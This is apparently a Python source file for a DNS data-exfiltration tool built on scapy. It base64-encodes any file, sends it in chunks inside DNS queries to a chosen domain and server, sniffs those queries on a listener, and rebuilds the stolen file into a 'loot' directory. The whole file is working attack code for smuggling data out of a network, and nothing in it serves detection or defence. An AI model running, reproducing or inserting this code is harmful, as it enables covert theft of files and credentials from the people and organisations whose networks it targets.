from __future__ import annotations

import base64
import os
import threading
import time
from pathlib import Path
from typing import Optional, Callable

import scapy.all as scapy
from loguru import logger


class DNSServer:
    def __init__(self, interface: str, listen_ip: str = "0.0.0.0"):
        self._interface = interface
        self._listen_ip = listen_ip
        self._running = False
        self._received: list[str] = []
        self._lock = threading.Lock()

    def start(self) -> None:
        self._running = True

        def handler(pkt):
            if not self._running:
                return
            try:
                if pkt.haslayer(scapy.DNS) and pkt[scapy.DNS].qr == 0:
                    qname = pkt[scapy.DNS].qd.qname
                    qname_str = qname.decode("utf-8") if isinstance(qname, bytes) else str(qname)
                    with self._lock:
                        self._received.append(qname_str)
                    logger.debug(f"exfil chunk: {qname_str[:80]}")

                    ip = pkt[scapy.IP]
                    udp = pkt[scapy.UDP]
                    resp = (
                        scapy.IP(src=ip.dst, dst=ip.src)
                        / scapy.UDP(sport=udp.dport, dport=udp.sport)
                        / scapy.DNS(
                            id=pkt[scapy.DNS].id, qr=1, aa=1, rd=1, ra=1, rcode=3,
                            qd=scapy.DNSQR(qname=qname_str),
                        )
                    )
                    scapy.sendp(scapy.Ether() / resp, iface=self._interface, verbose=False)
            except Exception:
                pass

        threading.Thread(
            target=lambda: scapy.sniff(
                iface=self._interface, filter="udp port 53",
                prn=handler, store=False,
                stop_filter=lambda _: not self._running,
            ),
            daemon=True,
        ).start()
        logger.info(f"exfil listener started on {self._interface}")

    def stop(self) -> list[str]:
        self._running = False
        with self._lock:
            result = list(self._received)
        logger.info(f"exfil listener stopped ({len(result)} chunks)")
        return result

    @property
    def chunks(self) -> list[str]:
        return list(self._received)


class DNSExfiltrator:
    CHUNK_SIZE = 40
    HEADER_PREFIX = "xfil-"

    def __init__(self, domain: str, interface: str, dns_server: str):
        self._domain = domain.rstrip(".")
        self._interface = interface
        self._dns_server = dns_server
        self._running = False
        self._stats = {"sent": 0, "bytes": 0}

    @property
    def stats(self) -> dict:
        return dict(self._stats)

    def exfiltrate_file(self, filepath: str | Path) -> bool:
        path = Path(filepath)
        if not path.exists():
            logger.error(f"file not found: {filepath}")
            return False

        with open(path, "rb") as f:
            data = f.read()

        encoded = base64.b64encode(data).decode("ascii")
        total = len(encoded)
        filename = path.name

        header = f"{self.HEADER_PREFIX}{filename}:{total}:"
        header_encoded = base64.b64encode(header.encode()).decode("ascii")
        self._send_query(f"{header_encoded}.{self._domain}")
        time.sleep(0.1)

        for i in range(0, total, self.CHUNK_SIZE):
            chunk = encoded[i:i + self.CHUNK_SIZE]
            query = f"{i:08x}.{chunk}.{self._domain}"
            self._send_query(query)
            self._stats["sent"] += 1
            self._stats["bytes"] += len(chunk)
            time.sleep(0.05)

        eof = f"{total:08x}.EOF.{self._domain}"
        self._send_query(eof)
        logger.info(f"exfiltration complete: {path.name} ({len(data)} bytes, {self._stats['sent']} queries)")
        return True

    def exfiltrate_text(self, text: str, label: str = "data") -> bool:
        import tempfile
        tmp = Path(tempfile.mktemp(suffix=f".{label}.txt"))
        tmp.write_text(text)
        result = self.exfiltrate_file(tmp)
        tmp.unlink(missing_ok=True)
        return result

    def _send_query(self, query: str) -> None:
        try:
            pkt = (
                scapy.IP(dst=self._dns_server)
                / scapy.UDP(sport=54321, dport=53)
                / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=query))
            )
            scapy.sendp(scapy.Ether() / pkt, iface=self._interface, verbose=False)
        except Exception as e:
            logger.warning(f"exfil send error: {e}")


def reconstruct_file(chunks: list[str], output_dir: str = "loot") -> Optional[Path]:
    if not chunks:
        return None

    all_data: dict[int, str] = {}
    filename = "exfiltrated.bin"
    total_size = 0

    for chunk in chunks:
        qname = chunk.rstrip(".")
        if "." not in qname:
            continue

        parts = qname.split(".")

        for i in range(len(parts) - 1):
            candidate = parts[i]
            if len(candidate) == 8 and candidate.isalnum():
                idx = int(candidate, 16)
                if i + 1 < len(parts):
                    data = parts[i + 1]
                    if data == "EOF":
                        continue
                    all_data[idx] = data
                break
            elif candidate.startswith(("eHhmaWwt", "eGZpbC0", "ZGZpbC0")):
                try:
                    decoded = base64.b64decode(candidate).decode("ascii")
                    if decoded.startswith(DNSExfiltrator.HEADER_PREFIX):
                        meta = decoded[len(DNSExfiltrator.HEADER_PREFIX):].split(":")
                        if len(meta) >= 2:
                            filename = meta[0]
                            total_size = int(meta[1])
                except Exception:
                    pass
                break

    if not all_data:
        return None

    encoded = ""
    for i in sorted(all_data.keys()):
        encoded += all_data[i]

    try:
        raw = base64.b64decode(encoded)
    except Exception as e:
        logger.error(f"decode failed: {e}")
        return None

    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / f"exfil_{filename}"
    with open(out_path, "wb") as f:
        f.write(raw)

    logger.info(f"file reconstructed: {out_path} ({len(raw)} bytes)")
    return out_path
